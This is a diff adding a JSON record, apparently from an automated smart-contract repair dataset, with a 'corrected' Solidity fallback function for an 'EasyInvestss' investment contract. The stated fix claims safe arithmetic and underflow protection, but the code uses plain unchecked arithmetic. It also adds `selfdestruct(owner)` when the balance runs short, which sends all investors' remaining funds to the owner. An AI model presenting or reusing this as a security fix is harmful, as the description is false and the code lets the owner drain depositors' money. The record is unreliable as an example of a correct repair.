@@ -1,0 +1,16 @@
+```json
+[{
+    "contract_name": "EasyInvestss",
+    "contract_version": "^0.4.24",
+    "state_variables": [],
+    "modifiers": [],
+    "functions": [
+        {
+            "function_name": "fallback",
+            "fix_info": "Fixed arithmetic vulnerabilities by reordering operations to prevent underflow, adding proper balance check before calculation, and using safe arithmetic operations. Also fixed the order of operations for amount calculation and improved gas handling.",
+            "corrected_code": "function () external payable {\n        if (invested[msg.sender] != 0) {\n            uint256 blocksPassed = block.number - atBlock[msg.sender];\n            uint256 amount = invested[msg.sender] * 4 * blocksPassed / 100 / 5900;\n            \n            if (address(this).balance < amount) {\n                selfdestruct(owner);\n                return;\n            }\n            \n            if (amount > 0) {\n                msg.sender.transfer(amount);\n            }\n        }\n        atBlock[msg.sender] = block.number;\n        invested[msg.sender] += msg.value;\n    }",
+            "change_type": "modified"
+        }
+    ]
+}]
+```
